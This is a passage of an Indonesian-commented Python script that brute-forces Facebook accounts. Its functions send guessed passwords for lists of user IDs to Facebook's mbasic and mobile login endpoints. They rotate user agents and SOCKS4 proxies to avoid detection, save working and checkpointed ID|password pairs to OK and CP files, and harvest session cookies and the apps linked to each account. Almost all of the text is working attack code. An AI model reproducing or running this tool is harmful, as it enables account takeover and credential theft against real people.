                        dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
                        koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
                        koki+=' m_pixel_ratio=2.625; wd=412x756'
                        heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                        po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
                        if "checkpoint" in po.cookies.get_dict().keys():
                                print(f'\r{x}└──{k} {idf}|{pw} • {b}{tahun(idf)}{x}\n└──{m} {ua}{N}')     
                                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                                akun.append(idf+'|'+pw)
                                cp+=1
                                break
                        elif "c_user" in ses.cookies.get_dict().keys():
                                ok+=1
                                coki=po.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                                print(f'\r{x}└──{H} {idf}|{pw} • {b}{tahun(idf)}{x}\n└──{H} {kuki}{x}\n└──{m} {ua}{N}')
                                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                                cek_apk(session,coki)
                                break

                        else:
                                continue
                except requests.exceptions.ConnectionError:
                        time.sleep(31)
        loop+=1
	
###>[ METHOD MBASIC ]<###
def crackmbasic(idf,pwv):
        global loop,ok,cp
        bo = random.choice([m,k,h,b,u,x])
        sys.stdout.write(f"\r[>] MBASIC {P}{loop}{P}/{P}{len(id)}{P} OK : {H}{ok}{P} CP : {k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
        sys.stdout.flush()
        nip=random.choice(prox)
        proxs= {'http': 'socks4://'+nip}
        ua = random.choice(['Mozilla/5.0 (Linux; U; Android 7.0; en-us; MI 5 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.0.3','Mozilla/5.0 (Linux; Android 10; SM-N971U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; CPH2121 Build/RP1A.200720.010; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; en-US; SM-G935F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 9; en-us; Redmi 6 Pro Build/PKQ1.180917.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.0.19 swan-mibrowser','Mozilla/5.0 (Linux; Android 11; 220233L2G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 11; id-id; Redmi 10A Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.11.1-gn','Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5pro Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; M2004J19C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 WpsMoffice/16.5.2/arm64-v8a/1344','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36'])
        ua2 = random.choice(['Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36'])
        ses = requests.Session()
        for pw in pwv:
                try:
                        ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
                        p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
                        dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
                        ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
                        po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
                        if "checkpoint" in po.cookies.get_dict().keys():
                                print(f'\r{x}└──{k} {idf}|{pw} • {b}{tahun(idf)}{x}\n└──{m} {ua}{N}')     
                                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                                akun.append(idf+'|'+pw)
                                cp+=1
                                break
                        elif "c_user" in ses.cookies.get_dict().keys():
                                ok+=1
                                coki=po.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                                print(f'\r{x}└──{H} {idf}|{pw} • {b}{tahun(idf)}{x}\n└──{H} {kuki}{x}\n└──{m} {ua}{N}')
                                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                                cek_apk(session,coki)
                                break

                        else:
                                continue
                except requests.exceptions.ConnectionError:
                        time.sleep(31)
        loop+=1
        
###>[ MOBILE REGULAR ]<###
def crackregular(idf,pwv,url):
        global loop,ok,cp
        bo = random.choice([m,k,h,b,u,x])
        sys.stdout.write(f"\r[>] REGULAR {P}{loop}{P}/{P}{len(id)}{P} OK : {H}{ok}{P} CP : {k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua2 = random.choice(ugen2)
        ses = requests.Session()
        for pw in pwv:
                try:
                        link = ses.get('https://{}/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&refsrc=deprecated&_rdr'.format(url)).text
                        data = {'lsd':re.search('name="lsd" value="(.*?)"', link).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', link).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', link).group(1),'li':re.search('name="li" value="(.*?)"', link).group(1),'try_number':'0','unrecognized_tries':'0','email':idf,'pass':pw,'login':'Masuk','bi_xrwh':'0'}
                        head = {'Host': url,'content-length': '128','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://' + url,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://{}/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&refsrc=deprecated&_rdr'.format(url),'accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
                        zzzz = ses.post('https://{}/login/device-based/regular/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&amp;refsrc=deprecated&amp;lwv=100'.format(url), data=data, headers=head, allow_redirects=False)
                        if "checkpoint" in po.cookies.get_dict().keys():
                                print(f'\r{x}└──{k} {idf}|{pw} • {b}{tahun(idf)}{x}\n└──{m} {ua}{N}')     
                                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                                akun.append(idf+'|'+pw)
                                cp+=1
                                break
                        elif "c_user" in ses.cookies.get_dict().keys():
                                ok+=1
                                coki=po.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                                print(f'\r{x}└──{H} {idf}|{pw} • {b}{tahun(idf)}{x}\n└──{H} {kuki}{x}\n└──{m} {ua}{N}')
                                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                                cek_apk(session,coki)
                                break

                        else:
                                continue
                except requests.exceptions.ConnectionError:
                        time.sleep(31)
        loop+=1

###>[ MENGECEK APLIKASI ]<###
def cek_apk(session,cookie):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

###>[ KONTROL ]<###
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/BMBF-DATA')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	#basari_tamvan(f'\n\t{x} {h}Halo Selamat Datang Wahai Hengker Termux :v{x}')
	#time.sleep(3)
	login()
	
###> SALAM CRAKER <###
